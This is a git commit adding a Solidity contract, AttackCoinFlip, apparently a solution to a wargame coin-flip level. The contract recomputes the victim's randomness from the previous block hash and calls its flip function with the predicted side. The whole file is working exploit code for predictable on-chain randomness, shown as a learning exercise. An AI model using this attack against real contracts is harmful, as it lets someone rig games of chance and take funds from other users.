2fbfbc9b025d2a612027c04ed9468a0492d0aa3b
Bookncp <nutchapol.poonkasem@gmail.com>
2023-07-14 17:54:50 +0700

    init repo

---
+++ 3-attckConinfilp.sol
@@ -0,0 +1,20 @@
+pragma solidity ^0.8.0;
+import "./3-coinFlip.sol";
+
+contract AttackCoinFlip {
+    CoinFlip public victimContract;
+  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+  constructor(address _victimContractAddress) {
+    victimContract = CoinFlip(_victimContractAddress);
+  }
+
+  function flip() public {
+    uint256 blockValue = uint256(blockhash(block.number - 1));
+
+    uint256 coinFlip = blockValue / FACTOR;
+    bool side = coinFlip == 1 ? true : false;
+
+    victimContract.flip(side);
+  }
+}
